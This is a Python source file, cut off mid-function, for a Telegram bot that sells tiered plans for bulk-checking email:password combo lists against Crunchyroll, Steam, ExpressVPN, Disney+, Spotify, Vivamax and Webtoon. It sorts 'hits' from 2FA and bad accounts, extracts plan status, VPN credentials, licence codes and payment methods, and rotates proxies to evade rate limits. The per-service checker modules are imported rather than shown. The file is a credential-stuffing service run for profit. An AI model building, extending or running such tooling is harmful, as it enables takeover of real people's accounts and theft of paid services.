from fastapi import FastAPI, Request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import html  # add at top of file
import os
import time
import string
import random
import uuid
import random
import threading
from threading import Event
import concurrent.futures

from datetime import datetime, date

from regions import REGION_HINTS

import asyncio
from functools import partial
from contextlib import asynccontextmanager
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from supabase import create_client, Client
from datetime import datetime, date, timedelta, timezone
from expressvpn_checker import ExpressVPNChecker
from vivamax_checker import check_vivamax, load_vivamax_products
from steam_checker import check_steam
from spotify_checker import check_spotify
from crunchyroll_checker import check_crunchyroll
from fetch_disney_proxies import (
    get_next_disney_proxy,
    remove_disney_proxy,
    get_pool_size,
    get_proxy_type_summary,
    load_proxies_from_text,
    set_uploaded_proxies,
    is_user_uploaded_pool,
    clear_proxy_pool,
    test_all_proxies,
    remove_dead_proxies,
)
from webtoon_checker import check_webtoon
from telegram.error import RetryAfter

# ============= TIMEZONE CONFIG =============
PH_TZ = timezone(timedelta(hours=8))

# ============= CONFIGURATION =============
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7399488750))
CHANNEL_USERNAME = "@caysredirect"

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_ANON_KEY")

TIMEOUT = 30

# ============= API MODES CONFIG (dynamic like the Netflix screenshot) =============
MODES = {
    "Crunchyroll": {
        "display": "Crunchyroll Mode",
        "icon": "🍥",
        "color": "🍥",
        "features": [
            "Extracts account plan & status",
            "Detects Active Subscription",
            "Shows Email Verification",
            "Detects Free Trial",
            "Saves detailed results in TXT files"
        ]
    },
    "Vivamax": {
        "display": "Vivamax Mode",
        "icon": "📺",
        "color": "📺",
        "features": [
            "Checks Vivamax PH streaming accounts",
            "Detects subscription status",
            "Shows account details",
            "Philippine streaming service",
            "Saves detailed results in TXT files"
        ]
    },
    "Steam": {
        "display": "Steam Mode",
        "icon": "🛠️",
        "color": "🛠️",
        "features": [
            "Checks Steam accounts",
            "Detects valid accounts + SteamID",
            "Detects 2FA required accounts",
            "Saves Hits + 2FA + Bad separately",
            "Supports high-speed multi-threading"
        ]
    },
    "ExpressVPN": {
        "display": "ExpressVPN Mode",
        "icon": "🔑",
        "color": "🔑",
        "features": [
            "Checks ExpressVPN accounts",
            "Shows plan, expiry, days left",
            "Shows OVPN + PPTP credentials",
            "License code & Payment method",
            ".ovpn file"
        ]
    },
    "Disney+": {
        "display": "Disney+ Mode",
        "icon": "🏰",
        "color": "🏰",
        "features": [
            "Checks Disney+ accounts",
            "Detects active subscription",
            "Shows plan & renewal date",
            "Email verified status",
            "Country detection"
        ],
        "disney_proxy_enabled": True,
    },
    "Webtoon": {
        "display": "Webtoon Mode",
        "icon": "📚",
        "color": "📚",
        "features": [
            "Checks Webtoon accounts",
            "Detects valid accounts",
            "Detects email verification required",
            "Shows account status",
            "Saves detailed results in TXT files"
        ]
    },
    "Spotify": {
        "display": "Spotify Mode",
        "icon": "🎵",
        "color": "🎵",
        "features": [
            "Checks Spotify accounts",
            "Detects registered emails",
            "Saves Hits & Bad separately",
            "Supports multi-threading",
            "Saves detailed results in TXT files"
        ]
    },
}

# ============= MODE TOGGLE SYSTEM (ADMIN ONLY) =============
MODE_STATUS = {
    "Crunchyroll": True,
    "Vivamax": True,
    "Steam": True,
    "ExpressVPN": True,
    "Disney+": True,
    "Webtoon": True,
    "Spotify": False,
}

def load_mode_status():
    global MODE_STATUS
    try:
        response = supabase.table("bot_settings").select("value").eq("key", "mode_status").execute()
        if response.data:
            saved = response.data[0]["value"]
            # Merge: keep all current modes, update with saved values
            for key in MODE_STATUS:
                if key in saved:
                    MODE_STATUS[key] = saved[key]
            # Save back to DB to include any new modes
            save_mode_status()
            print(f"✅ Mode status loaded from DB: {MODE_STATUS}")
        else:
            save_mode_status()
            print("✅ Mode status initialized in DB")
    except Exception as e:
        print(f"⚠️ Failed to load mode status: {e}")

def save_mode_status():
    """Save current MODE_STATUS to Supabase"""
    try:
        supabase.table("bot_settings").upsert({
            "key": "mode_status",
            "value": MODE_STATUS,
            "updated_at": datetime.now().isoformat()
        }).execute()
        print(f"✅ Mode status saved: {MODE_STATUS}")  # ← add this
    except Exception as e:
        print(f"⚠️ Failed to save mode status: {e}")

# ============= GLOBAL PROXY SETTINGS =============
def load_global_proxy_enabled() -> bool:
    """Load global proxy toggle from bot_settings"""
    try:
        response = supabase.table("bot_settings").select("value").eq("key", "global_proxy_enabled").execute()
        if response.data:
            return response.data[0]["value"]
        return False
    except:
        return False

def save_global_proxy_enabled(enabled: bool):
    """Save global proxy toggle to bot_settings"""
    try:
        supabase.table("bot_settings").upsert({
            "key": "global_proxy_enabled",
            "value": enabled,
            "updated_at": datetime.now().isoformat()
        }).execute()
    except Exception as e:
        print(f"⚠️ Failed to save global proxy setting: {e}")

# In-memory cache so we don't hit DB on every check
_global_proxy_enabled: bool = False

def is_global_proxy_enabled() -> bool:
    return _global_proxy_enabled

def set_global_proxy_enabled(enabled: bool):
    global _global_proxy_enabled
    _global_proxy_enabled = enabled
    save_global_proxy_enabled(enabled)

def is_mode_enabled(mode_key: str) -> bool:
    """Check if mode is active (admin bypasses this)"""
    return MODE_STATUS.get(mode_key, True)

def toggle_mode(mode_key: str) -> bool:
    """Toggle mode and return new status (True = enabled)"""
    if mode_key not in MODE_STATUS:
        return False
    MODE_STATUS[mode_key] = not MODE_STATUS[mode_key]
    save_mode_status()  # ← ADD THIS
    return MODE_STATUS[mode_key]

def create_steam_games_file(result: dict, user_plan: str, timestamp: str) -> str | None:
    """Creates a nicely formatted TXT file with full Steam games list (single check)"""
    games = result.get('games', [])
    if not games:
        return None

    email = result.get('email', 'N/A')
    steamid = result.get('steamid', 'N/A')
    total_games = result.get('total_games_owned', result.get('games_count', len(games)))
    total_playtime = result.get('total_playtime', 0)
    country = result.get('country', 'Unknown')
    profile_name = result.get('profile_name', 'Unknown')
    twofa = result.get('twofa', False)
    twofa_type = result.get('twofa_type', 'None')

    lines = []
    lines.append("=" * 60)
    lines.append("        🎮 STEAM ACCOUNT - FULL GAMES LIST")
    lines.append("=" * 60)
    lines.append(f"  📧 Email      : {email}")
    lines.append(f"  🆔 SteamID    : {steamid}")
    lines.append(f"  👤 Profile    : {profile_name}")
    lines.append(f"  🌍 Country    : {country}")
    lines.append(f"  🎮 Total Games: {total_games}")
    total_playtime_display = result.get('total_playtime_display', f"{total_playtime:,}h")
    lines.append(f"  ⏳ Total Play : {total_playtime_display}")
    if twofa:
        lines.append(f"  🔐 2FA Type   : {twofa_type}")
    lines.append(f"  👑 Plan       : {user_plan}")
    lines.append(f"  📅 Checked    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  🤖 Bot        : @clydecrunchybot")
    lines.append(f"  📢 Channel    : @caysredirect")
    lines.append("=" * 60)
    lines.append("")
    lines.append("  GAMES LIST (Sorted by Playtime)")
    lines.append("-" * 60)
    lines.append(f"  {'#':<5} {'Game Name':<40} {'Playtime':>10}")
    lines.append(f"  {'-'*5} {'-'*40} {'-'*10}")

    for i, game in enumerate(games, start=1):
        name = game.get('name', 'Unknown Game')
        playtime = game.get('playtime_display', f"{game.get('playtime_hours', 0)}h")
        if len(name) > 38:
            name = name[:35] + "..."
        lines.append(f"  {i:<5} {name:<40} {playtime:>10}")

    lines.append("-" * 60)
    lines.append(f"  Total: {total_games} games ({len(games)} with names) | {total_playtime_display} total")
    lines.append("=" * 60)
    lines.append("")
    lines.append("  Generated by @caysredirect | @caydigitals")
    lines.append("=" * 60)

    content = "\n".join(lines)
    filepath = f"/tmp/steam_games_{steamid}_{timestamp}.txt"
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    return filepath

def create_steam_games_file_bulk(hits: list, user_plan: str, timestamp: str) -> str | None:
    """Creates ONE combined TXT file with ALL hits' games for bulk scan"""
    # Only include hits that have games
    hits_with_games = [h for h in hits if h.get('games')]
    if not hits_with_games:
        return None

    lines = []
    lines.append("=" * 60)
    lines.append("     🎮 STEAM BULK SCAN - ALL GAMES REPORT")
    lines.append("=" * 60)
    lines.append(f"  ✅ Total Hits     : {len(hits)}")
    lines.append(f"  🎮 Hits w/Games   : {len(hits_with_games)}")
    lines.append(f"  👑 Plan           : {user_plan}")
    lines.append(f"  📅 Scanned        : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  🤖 Bot            : @clydecrunchybot")
    lines.append(f"  📢 Channel        : @caysredirect")
    lines.append("=" * 60)

    # Combined totals
    combined_games = sum(h.get('total_games_owned', h.get('games_count', 0)) for h in hits_with_games)
    combined_playtime = sum(h.get('total_playtime', 0) for h in hits_with_games)

    for idx, hit in enumerate(hits_with_games, start=1):
        email = hit.get('email', 'N/A')
        steamid = hit.get('steamid', 'N/A')
        total_games = hit.get('total_games_owned', hit.get('games_count', len(hit['games'])))
        total_playtime = hit.get('total_playtime', 0)
        country = hit.get('country', 'Unknown')
        profile_name = hit.get('profile_name', 'Unknown')
        twofa = hit.get('twofa', False)
        twofa_type = hit.get('twofa_type', 'None')
        games = hit.get('games', [])

        lines.append("")
        lines.append("=" * 60)
        lines.append(f"  HIT #{idx} — {email}")
        lines.append("=" * 60)
        lines.append(f"  📧 Email      : {email}")
        lines.append(f"  🆔 SteamID    : {steamid}")
        lines.append(f"  👤 Profile    : {profile_name}")
        lines.append(f"  🌍 Country    : {country}")
        lines.append(f"  🎮 Total Games: {total_games}")
        total_playtime_display = hit.get('total_playtime_display', f"{total_playtime:,}h")
        lines.append(f"  ⏳ Total Play : {total_playtime_display}")
        lines.append(f"  🔐 2FA        : {'Yes (' + twofa_type + ')' if twofa else 'No'}")
        lines.append("-" * 60)
        lines.append(f"  {'#':<5} {'Game Name':<40} {'Playtime':>10}")
        lines.append(f"  {'-'*5} {'-'*40} {'-'*10}")

        for i, game in enumerate(games, start=1):
            name = game.get('name', 'Unknown Game')
            playtime = game.get('playtime_display', f"{game.get('playtime_hours', 0)}h")
            if len(name) > 38:
                name = name[:35] + "..."
            lines.append(f"  {i:<5} {name:<40} {playtime:>10}")

        lines.append("-" * 60)
        unplayed = total_games - len(games)
        unplayed_note = f", {unplayed} unplayed (0h)" if unplayed > 0 else ""
        lines.append(f"  Total: {total_games} games ({len(games)} named{unplayed_note}) | {total_playtime_display}")
        lines.append("=" * 60)

    # Summary section at bottom
    lines.append("")
    lines.append("=" * 60)
    lines.append("  SUMMARY")
    lines.append("=" * 60)
    for idx, hit in enumerate(hits_with_games, start=1):
        email = hit.get('email', 'N/A')
        g = hit.get('total_games_owned', hit.get('games_count', 0))
        p = hit.get('total_playtime_display', f"{hit.get('total_playtime', 0):,}h")
        lines.append(f"  ✅ Hit #{idx:<3} {email:<35} {g:>4} games | {p}")
    lines.append("-" * 60)
    lines.append(f"  🎮 Combined Total: {combined_games} games | {combined_playtime:,} hours")
    lines.append("=" * 60)
    lines.append("")
    lines.append("  Generated by @caysredirect | @caydigitals")
    lines.append("=" * 60)

    content = "\n".join(lines)
    filepath = f"/tmp/steam_games_bulk_{timestamp}.txt"
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    return filepath

# ============= PROXYLESS BANNER (Reusable & Clean) =============
def get_proxyless_banner(proxy_enabled: bool = False, pool_size: int = 0) -> str:
    if proxy_enabled:  # remove the pool_size check
        return f"""🌐 <b>Proxy Mode</b> ✅
- Proxy rotation active ({pool_size} proxies loaded)
- Auto-fallback to direct if pool empty
- Applied to Disney+, Webtoon, Crunchyroll and Vivamax
━━━━━━━━━━━━━━━━━━━━━━━━"""
    else:
        return """🚀 <b>Proxyless Mode</b> ✅
- No proxy list required
- Ultra fast & stable checks
- Works instantly on all plans
━━━━━━━━━━━━━━━━━━━━━━━━"""

async def error_handler(update, context):
    if isinstance(context.error, RetryAfter):
        wait = context.error.retry_after
        print(f"⚠️ Global rate limit hit. Waiting {wait}s...")
        await asyncio.sleep(wait + 1)
    else:
        print(f"❌ Unhandled error: {context.error}")

async def safe_send(coro):
    """Automatically retries on flood control."""
    for attempt in range(3):
        try:
            return await coro
        except RetryAfter as e:
            print(f"⚠️ Flood control hit. Waiting {e.retry_after}s...")
            await asyncio.sleep(e.retry_after + 1)
        except Exception as e:
            print(f"❌ Send error: {e}")
            return None
    return None

async def animate_progress(status_msg, email, stop_event, proxy_line: str = "", live_status: list = None):
    stages = [
        (10, "🔍 Connecting to server..."),
        (25, "🔐 Authenticating..."),
        (45, "📡 Fetching account info..."),
        (65, "📊 Checking subscription..."),
        (80, "📦 Extracting details..."),
        (95, "⏳ Finalizing..."),
    ]
    
    for percent, label in stages:
        if stop_event.is_set():
            return
        # Show live retry info from checker thread if available
        live_label = live_status[0] if (live_status and live_status[0]) else label
        try:
            await status_msg.edit_text(
                f"🔍 <b>Checking Account</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📧 <code>{email}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{proxy_line}"
                f"📌 {live_label}\n"
                f"⚡ Progress: <b>{percent}%</b>",
                parse_mode='HTML'
            )
        except:
            pass
        
        await asyncio.sleep(1.2)

# ============= SCAN CONTROL (IN-MEMORY - INSTANT) =============
_scan_states: dict[str, str] = {}
_scan_lock = threading.Lock()

def set_scan_status(scan_id: str, status: str):
    with _scan_lock:
        _scan_states[scan_id] = status

def get_scan_status(scan_id: str) -> str:
    with _scan_lock:
        return _scan_states.get(scan_id, "stopped")

def delete_scan(scan_id: str):
    with _scan_lock:
        _scan_states.pop(scan_id, None)

# ============= DAILY REWARD TIMER HELPER (Fixed - uses UTC) =============
def is_daily_reward_active(stats: dict) -> bool:
    """Returns True if the 24-hour reward timer is still active"""
    last_claimed = stats.get('daily_reward_last_claimed')
    if not last_claimed:
        return False
    
    try:
        if isinstance(last_claimed, str):
            # Remove timezone info and treat as UTC
            if 'Z' in last_claimed or '+' in last_claimed:
                last_claimed = last_claimed.split('+')[0].split('Z')[0]
            last_claimed = datetime.fromisoformat(last_claimed)
        
        now = datetime.utcnow()
        return (now - last_claimed).total_seconds() < 24 * 3600
    except:
        return False

def clean_expired_daily_reward(stats: dict):
    """Automatically clean up expired rewards so Stats/Rewards menu shows correct values"""
    if is_daily_reward_active(stats):
        return stats
    
    user_id = stats.get('user_id')
    if stats.get('daily_reward_lines', 0) > 0 or stats.get('daily_reward_claimed', False):
        update_user_stats(user_id, {
            "daily_reward_lines": 0,
            "daily_reward_claimed": False
        })
        stats['daily_reward_lines'] = 0
        stats['daily_reward_claimed'] = False
    return stats

def get_remaining_reward_time(stats: dict) -> str:
    """Returns countdown like '23:45:12' or 'Ready to Claim!'"""
    last_claimed = stats.get('daily_reward_last_claimed')
    if not last_claimed:
        return "🟢 <b>Ready to Claim!</b>"
    
    try:
        if isinstance(last_claimed, str):
            if 'Z' in last_claimed or '+' in last_claimed:
                last_claimed = last_claimed.split('+')[0].split('Z')[0]
            last_claimed = datetime.fromisoformat(last_claimed)
        
        now = datetime.utcnow()
        remaining = last_claimed + timedelta(hours=24) - now
        
        if remaining.total_seconds() <= 0:
            return "🟢 <b>Ready to Claim!</b>"
        
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"⏳ <code>{hours:02d}:{minutes:02d}:{seconds:02d}</code>"
    except:
        return "🟢 <b>Ready to Claim!</b>"

def format_files_display(today_files, max_files, plan):
    """Show remaining files for PAID plans, '-' for FREE"""
    if plan and plan.upper() == "FREE":
        return "-"
    
    remaining = max_files - today_files
    return f"{remaining}/{max_files}"

def generate_referral_code(user_id: int) -> str:
    """Auto-generate nice referral code like CAY73994"""
    prefix = "CAY"
    suffix = str(user_id % 100000).zfill(5)  # last 5 digits
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))
    return f"{prefix}{suffix}{random_part}"[:12]

def get_referral_bonus_per_referral(plan: str) -> int:
    """Referral bonus per referral — hard to earn version"""
    plan = plan.upper()
    if plan == "VIP" or plan == "YEARLY":
        return 30
    elif plan == "BASIC":
        return 12
    else:  # FREE
        return 3

# ============= GLOBAL MODE DISPLAY HELPER (clean & future-proof) =============
def get_mode_display(mode_key: str = None) -> str:
    """Returns formatted mode like '🍥 Crunchyroll Mode' with icon.
    Works for any mode you add to the MODES dict."""
    if not mode_key or mode_key not in MODES:
        mode_key = "Crunchyroll"
    
    mode_info = MODES[mode_key]
    return f"{mode_info['icon']} {mode_info['display']}"

# ============= PLAN WITH EMOJI HELPER =============
def get_plan_with_emoji(plan_key: str) -> str:
    """Returns plan with its specific emoji (matches Membership Plans)"""
    plan_key = (plan_key or "FREE").upper()
    emojis = {
        "FREE": "🆓",
        "BASIC": "⭐",
        "VIP": "👑",
        "YEARLY": "🌟",
        "OWNER": "🔱"
    }
    emoji = emojis.get(plan_key, "📌")
    config = PLAN_CONFIG.get(plan_key, PLAN_CONFIG["FREE"])
    return f"{emoji} {config['display_name']}"

# ============= MODE DISPATCHER =============
def get_checker_function(api_mode: str, user_id: int = None, live_status: list = None):
    """Returns the correct checker function + blocks normal users from Vivamax"""
    if user_id and user_id != ADMIN_ID and api_mode == "Vivamax":
        api_mode = "Crunchyroll"

    proxy_url = None
    if user_id:
        if user_id == ADMIN_ID:
            # Admin uses global toggle
            if is_global_proxy_enabled():
                proxy_url = get_next_disney_proxy(ADMIN_ID)
        else:
            # Regular users — check their own plan + personal toggle
            stats = get_user_stats(user_id)
            plan = stats.get("plan", "FREE").upper()
            user_proxy_enabled = stats.get("proxy_enabled", False)
            
            if user_proxy_enabled:
                proxy_url = get_next_disney_proxy(user_id)

    checkers = {
        "Crunchyroll": lambda email, password: check_crunchyroll(email, password, proxy_url),
        "Vivamax":     lambda email, password: check_vivamax(email, password, proxy_url),
        "Steam":       lambda email, password: check_steam(email, password, proxy_url),
        "ExpressVPN":  lambda email, password: check_expressvpn(email, password, proxy_url),
        "Disney+":     lambda email, password: check_disneyplus(email, password, proxy_url=proxy_url, user_id=user_id, live_status=live_status),
        "Webtoon":     lambda email, password: check_webtoon(email, password, proxy_url=proxy_url),
        "Spotify":     lambda email, password: check_spotify(email, password, proxy_url),
    }
    return checkers.get(api_mode, check_crunchyroll)

# ============= PLAN CONFIG =============
PLAN_CONFIG = {
    "FREE": {
        "display_name": "FREE",
        "daily_limit": 25,
        "max_threads": 8,
        "multi_scan_max_files": 0,
        "queue_waiting": True
    },
    "BASIC": {
        "display_name": "BASIC PLAN (WEEKLY)",
        "daily_limit": 150,
        "max_threads": 25,
        "multi_scan_max_files": 3,
        "queue_waiting": False
    },
    "VIP": {
        "display_name": "VIP PLAN (MONTHLY)",
        "daily_limit": None,          # Unlimited
        "max_threads": 40,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    },
    "YEARLY": {
        "display_name": "YEARLY VIP",
        "daily_limit": None,          # Unlimited
        "max_threads": 40,
        "multi_scan_max_files": 5,
        "queue_waiting": False
    },
    "OWNER": {
        "display_name": "OWNER",
        "daily_limit": None,
        "max_threads": 50,
        "multi_scan_max_files": 999,
        "queue_waiting": False
    }
}

# ============= PLAN DEFAULTS FOR /setplan COMMAND =============
PLAN_DEFAULTS = {
    "FREE": {
        "plan": "FREE",
        "base_plan_limit": 25, 
        "threads": 8,
        "expires": "N/A"
    },
    "BASIC": {
        "plan": "BASIC",
        "base_plan_limit": 150,
        "threads": 25   ,
        "expires": (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    },
    "VIP": {
        "plan": "VIP",
        "base_plan_limit": 999999,   # practically unlimited
        "threads": 40,
        "expires": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    },
    "YEARLY": {
        "plan": "YEARLY",
        "base_plan_limit": 999999,
        "threads": 40,
        "expires": (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")
    },
    "OWNER": {
        "plan": "OWNER",
        "base_plan_limit": 999999,
        "threads": 50,
        "expires": "N/A"
    }
}

class RateLimiter:
    """Best proxyless rate limiter - controls total requests per second"""
    def __init__(self, max_rps: int = 35):
        self.max_rps = max_rps
        self.lock = threading.Lock()
        self.tokens = 0
        self.last_refill = time.time()

    def acquire(self):
        """Wait until we can send the next request"""
        while True:
            with self.lock:
                now = time.time()
                if now - self.last_refill >= 1.0:
                    self.tokens = self.max_rps
                    self.last_refill = now
                if self.tokens > 0:
                    self.tokens -= 1
                    return
            time.sleep(0.008)




# ============= DAYS REMAINING HELPER =============
def get_days_remaining(expires_str: str) -> str:
    """Returns nice countdown text for dashboard and stats"""
    if not expires_str or expires_str.upper() == "N/A":
        return "♾️"  # FREE plan or no expiry
    
    try:
        # Handle both "2026-06-04" and "2026-06-04T..." formats
        date_part = expires_str.split('T')[0]
        expires_date = datetime.strptime(date_part, "%Y-%m-%d").date()
        today = date.today()
        
        delta = (expires_date - today).days
        
        if delta < 0:
            return "❌ Expired"
        elif delta == 0:
            return "Expires today"
        elif delta == 1:
            return "1 day left"
        else:
            return f"{delta} days left"
            
    except Exception:
        # Fallback if date format is weird
        return expires_str

def get_plan_limits(stats: dict):
    plan_key = stats.get("plan", "FREE").upper()
    config = PLAN_CONFIG.get(plan_key, PLAN_CONFIG["FREE"])
    
    base_limit = config["daily_limit"]
    
    daily_reward_lines = stats.get("daily_reward_lines", 0)
    if not is_daily_reward_active(stats):
        daily_reward_lines = 0
    
    referral_bonus_per = get_referral_bonus_per_referral(stats.get("plan", "FREE"))
    total_referral_bonus = stats.get("referrals", 0) * referral_bonus_per
    
    bonus_lines = daily_reward_lines + total_referral_bonus
    
    if base_limit is None:  # VIP & YEARLY = unlimited
        daily_limit = None
        remaining_text = "♾️"
        base_limit_text = "♾️"
    else:
        daily_limit = base_limit + bonus_lines
        today_used = stats.get("today_scans", 0)
        remaining = max(0, daily_limit - today_used)
        remaining_text = f"{remaining}/{daily_limit}"
        base_limit_text = f"{base_limit:,}"
    
    return {
        "display_name": config["display_name"],
        "daily_limit": daily_limit,
        "max_threads": config["max_threads"],
        "multi_scan_max_files": config["multi_scan_max_files"],
        "queue_waiting": config["queue_waiting"],
        "remaining_text": remaining_text,
        "current_threads": stats.get("threads", 10),
        "base_limit_text": base_limit_text
    }

async def notify_admin_custom_plan(context, result: dict, checker_user_id: int, is_bulk: bool = False):
    """Send private DM to owner when a new/unknown Custom Plan is found"""
    try:
        plan_name = result.get('plan', 'Unknown')
        subs_id = "N/A"
        if "Custom Plan (" in plan_name:
            subs_id = plan_name.split("(", 1)[1].rstrip(")")

        text = f"""
🆕 <b>New Vivamax Custom Plan Detected!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Checker User ID:</b> <code>{checker_user_id}</code>
📧 <b>Email:</b> <code>{result.get('email', 'N/A')}</code>
📊 <b>Status:</b> <code>{result.get('status', 'N/A')}</code>
📌 <b>Detected Plan:</b> <code>{plan_name}</code>
🔑 <b>Subscription ID:</b> <code>{subs_id}</code>
💰 <b>Price:</b> <code>{result.get('price', 'N/A')}</code>
📆 <b>Billing:</b> <code>{result.get('billing', 'N/A')}</code>
⏳ <b>Days Left:</b> <code>{result.get('days_left', 'N/A')}</code>
🔢 <b>Bulk Scan:</b> {'Yes' if is_bulk else 'No'}
━━━━━━━━━━━━━━━━━━━━━━━━
Add this to your VIVAMAX_FALLBACK_PLANS or VIVAMAX_PRODUCTS dictionary.
        """.strip()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=text,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    except Exception as e:
        print(f"⚠️ Failed to notify admin about custom plan: {e}")

# ============= SUPABASE CLIENT =============
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ← ADD THIS RIGHT AFTER
print(f"✅ Supabase URL: {SUPABASE_URL}")
print(f"✅ Supabase Key starts with: {SUPABASE_KEY[:20] if SUPABASE_KEY else 'MISSING'}")

async def cancel_command(update: Update, context: CallbackContext):
    """Handles /cancel during broadcast mode"""
    user_id = update.effective_user.id
    
    if user_id == ADMIN_ID and context.user_data.get('waiting_for_broadcast'):
        context.user_data['waiting_for_broadcast'] = False
        try:
            await update.message.delete()
        except:
            pass
        await update.message.reply_text(
            "❌ <b>Broadcast cancelled.</b>\n\n"
            "Use /start to return to the main menu.",
            parse_mode='HTML'
        )
    else:
        pass  # ignore /cancel in other contexts

async def notify_admin_new_user(context, user_id: int, stats: dict):
    """Send notification to admin when a new user joins the bot"""
    try:
        username = f"@{stats.get('username')}" if stats.get('username') else "No username"
        first_name = stats.get('first_name', 'Unknown')
        referral_code = stats.get('referral_code', 'N/A')
        registered = stats.get('registered', 'N/A')

        text = f"""
🆕 <b>New User Joined the Bot!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> <code>{user_id}</code>
👥 <b>Username:</b> {username}
📛 <b>Name:</b> {first_name}
🔗 <b>Referral Code:</b> <code>{referral_code}</code>
📅 <b>Registered:</b> <code>{registered}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
        """.strip()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=text,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    except Exception as e:
        print(f"⚠️ Failed to notify admin about new user: {e}")

# ============= OWNER RESTRICTION =============
def is_owner(update: Update):
    return update.effective_user and update.effective_user.id == ADMIN_ID

# ============= SIMPLE CHANNEL JOIN CHECK (EASY WAY) =============
async def check_subscription(update: Update, context: CallbackContext) -> bool:
    """Returns True if user is in @caysredirect. Owner always allowed."""
    if is_owner(update):
        return True
    
    user = update.effective_user
    if not user:
        return False

    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user.id)
        # These statuses = joined
        return member.status in ["member", "administrator", "creator", "restricted"]
    except:
        return False
    
# ============= VERIFICATION BUTTON MESSAGE =============
async def send_join_channel_message(update: Update, context: CallbackContext):
    """Shows clean message with Join button + Verify button"""
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}")],
        [InlineKeyboardButton("✅ I've Joined - Verify", callback_data="verify_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = f"""
<b>🚫 Access Restricted</b>
━━━━━━━━━━━━━━━━━━━━━━━━
You must be a member of our channel to use the bot.

📢 <a href="https://t.me/{CHANNEL_USERNAME.strip('@')}">{CHANNEL_USERNAME}</a>

After joining, tap the button below 👇
    """.strip()

    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=text,
            parse_mode='HTML',
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text(
            text=text,
            parse_mode='HTML',
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )

# ============= BLOCKING RUNNER =============
async def run_blocking(func, *args, **kwargs):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, partial(func, *args, **kwargs))

# ============= FASTAPI LIFESPAN =============
@asynccontextmanager
async def lifespan(app: FastAPI):
    global tg_app
    await tg_app.initialize()
    await tg_app.start()
    
    print("🚀 Starting bot...")
    await load_vivamax_products()
    load_mode_status() 
    # Load global proxy setting
    global _global_proxy_enabled
    _global_proxy_enabled = load_global_proxy_enabled()
    print(f"✅ Global proxy enabled: {_global_proxy_enabled}")

    webhook_url = os.getenv("WEBHOOK_URL")
    if webhook_url:
        await tg_app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["message", "edited_message", "channel_post", "callback_query"]
        )
        print(f"✅ Webhook set → {webhook_url}")
    else:
        print("⚠️ WEBHOOK_URL env var is missing!")

    print("🚀 Bot started on Render")
    yield

    await tg_app.stop()
    await tg_app.shutdown()

# ============= FASTAPI + TG APP =============
app = FastAPI(lifespan=lifespan)
tg_app = Application.builder().token(BOT_TOKEN).build()

def get_user_stats(user_id: int):
    response = supabase.table("user_stats").select("*").eq("user_id", user_id).execute()
    if response.data:
        stats = response.data[0]
        stats = clean_expired_daily_reward(stats)
        
        # Auto-generate referral code if missing (for existing users)
        if not stats.get('referral_code'):
            new_code = generate_referral_code(user_id)  # ← was ADMIN_ID
            update_user_stats(user_id, {"referral_code": new_code})
            stats['referral_code'] = new_code
        
        # Auto update last active
        update_user_stats(user_id, {"last_active": datetime.now().isoformat()})
        return stats
    
    # First time user - create row with referral code
    default = {
        "user_id": user_id,
        "username": None,
        "first_name": None,
        "registered": str(date.today()),
        "last_active": datetime.now().isoformat(),
        "plan": "FREE",
        "expires": "N/A",
        "threads": 8,
        "api_mode": "Crunchyroll",
        "total_scans": 0,
        "total_hits": 0,
        "total_free": 0,
        "total_2fa": 0,
        "total_combo_files": 0,
        "today_date": str(datetime.now(PH_TZ).date()),
        "today_scans": 0,
        "today_files": 0,
        "referrals": 0,
        "referral_code": generate_referral_code(user_id),
        "referred_by": None,
        "daily_reward_claimed": False,
        "daily_reward_last_claimed": None,
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0,
        "base_plan_limit": 25,
        "proxy_enabled": False,
        "is_banned": False,
        "created_at": datetime.now().isoformat(),
        "updated_at": datetime.now().isoformat()
    }
    supabase.table("user_stats").insert(default).execute()
    return default

# ============= TELEGRAM BOT HANDLERS =============
def update_user_stats(user_id: int, data: dict):
    data["updated_at"] = datetime.now().isoformat()
    supabase.table("user_stats").update(data).eq("user_id", user_id).execute()

def reset_daily_if_needed(stats: dict, user_id: int):
    """Automatically reset daily scans AND daily files at 00:00 Philippine Time"""
    plan = stats.get("plan", "FREE").upper()
    
    if plan == "OWNER":
        return

    today_ph = datetime.now(PH_TZ).date()
    today_str = str(today_ph)
    
    if stats.get("today_date") != today_str:
        update_user_stats(user_id, {
            "today_scans": 0,
            "today_files": 0,
            "today_date": today_str
